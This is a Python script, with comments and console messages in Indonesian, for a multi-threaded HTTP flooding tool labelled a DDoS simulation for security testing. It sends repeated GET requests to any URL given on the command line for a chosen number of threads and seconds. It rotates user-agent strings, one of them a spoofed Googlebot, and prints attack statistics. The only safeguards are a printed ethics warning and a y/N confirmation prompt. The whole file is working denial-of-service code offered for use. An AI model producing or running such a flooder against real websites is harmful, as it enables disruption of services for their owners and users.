import argparse
import requests
import threading
import time
import random
from urllib.parse import urlparse

class DDoSTester:
    def __init__(self, target_url, num_threads=10, duration=60):
        self.target_url = target_url
        self.num_threads = num_threads
        self.duration = duration
        self.is_attacking = False
        self.requests_sent = 0
        self.successful_requests = 0
        self.failed_requests = 0
        
    def user_agent(self):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
        ]
        return random.choice(user_agents)
    
    def send_request(self):
        headers = {
            'User-Agent': self.user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
        try:
            response = requests.get(self.target_url, headers=headers, timeout=5)
            if response.status_code == 200:
                return True
            else:
                return False
        except:
            return False
    
    def attack(self):
        thread_requests = 0
        start_time = time.time()
        
        while self.is_attacking and (time.time() - start_time) < self.duration:
            success = self.send_request()
            thread_requests += 1
            
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
                
        self.requests_sent += thread_requests
    
    def start_attack(self):
        print(f"[+] Memulai serangan DDoS ke {self.target_url}")
        print(f"[+] Jumlah thread: {self.num_threads}")
        print(f"[+] Durasi: {self.duration} detik")
        print("[+] Tekan Ctrl+C untuk menghentikan serangan\n")
        
        self.is_attacking = True
        threads = []
        
        # Membuat dan memulai thread
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.attack)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Menunggu sampai durasi serangan selesai
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print("\n[!] Serangan dihentikan oleh pengguna")
        
        self.is_attacking = False
        
        # Menunggu semua thread selesai
        for thread in threads:
            thread.join()
        
        # Menampilkan hasil
        print("\n[+] Serangan selesai")
        print(f"[+] Total requests dikirim: {self.requests_sent}")
        print(f"[+] Requests berhasil: {self.successful_requests}")
        print(f"[+] Requests gagal: {self.failed_requests}")
        print(f"[+] Requests per detik: {self.requests_sent / self.duration:.2f}")

def main():
    parser = argparse.ArgumentParser(description='Tools Simulasi DDoS (Untuk Pengujian Keamanan)')
    parser.add_argument('url', help='URL target untuk pengujian')
    parser.add_argument('-t', '--threads', type=int, default=10, 
                       help='Jumlah thread (default: 10)')
    parser.add_argument('-d', '--duration', type=int, default=60,
                       help='Durasi serangan dalam detik (default: 60)')
    
    args = parser.parse_args()
    
    # Validasi URL
    parsed_url = urlparse(args.url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print("[-] URL tidak valid. Pastikan menggunakan format http:// atau https://")
        return
    
    # Validasi parameter
    if args.threads <= 0 or args.duration <= 0:
        print("[-] Threads dan duration harus lebih besar dari 0")
        return
    
    # Peringatan etika
    print("[!] PERINGATAN: Tools ini hanya untuk tujuan pengujian keamanan dan edukasi.")
    print("[!] Jangan gunakan untuk serangan terhadap website tanpa izin pemilik.")
    print("[!] Penulis tidak bertanggung jawab atas penyalahgunaan tools ini.\n")
    
    confirm = input("[?] Apakah Anda yakin ingin melanjutkan? (y/N): ")
    if confirm.lower() != 'y':
        print("[-] Dibatalkan.")
        return
    
    # Memulai serangan
    tester = DDoSTester(args.url, args.threads, args.duration)
    tester.start_attack()

if __name__ == "__main__":
    main()